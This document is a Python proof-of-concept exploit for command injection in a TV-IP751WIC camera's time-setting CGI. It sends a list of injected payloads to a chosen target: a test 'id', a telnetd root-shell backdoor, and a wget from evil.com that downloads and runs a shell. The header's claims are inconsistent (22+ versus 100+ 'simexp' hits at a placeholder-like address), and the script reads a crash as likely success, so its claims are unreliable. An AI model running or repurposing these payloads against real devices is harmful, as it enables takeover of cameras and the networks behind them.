#!/usr/bin/env python3
"""
PoC: TV-IP751WIC alphapd Time Command Injection
CVE Candidate | CWE-77 | CVSS 9.8
FirmRec: 22+ simexp hits @ 0x41414141 (CVE-2020-25506)
"""
import requests, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
BASE = f"http://{TARGET}/cgi-bin/admin"

# Camera HTTP API requires no auth for initial setup
PAYLOADS = [
    ("; id; #", "test command execution"),
    ("; telnetd -l /bin/sh -p 9999; #", "open telnet backdoor"),
    ("; wget http://evil.com/mips_shell -O /tmp/sh; chmod +x /tmp/sh; /tmp/sh & #", "download+exec shell"),
]

print(f"[*] TV-IP751WIC Time Command Injection PoC")
print(f"[*] Target: {TARGET}")
print(f"[*] FirmRec: 100+ simexp confirm 0x41414141")
print()

for payload, desc in PAYLOADS:
    try:
        r = requests.get(f"{BASE}/set_time.cgi", params={
            "Currenttime": f"2024-01-01 00:00:00{payload}",
            "TimeZone": "GMT+8",
        }, timeout=5)
        print(f"  [{r.status_code}] {desc}: {payload[:50]}...")
    except:
        print(f"  [CRASH] Device disconnected — injection likely succeeded")
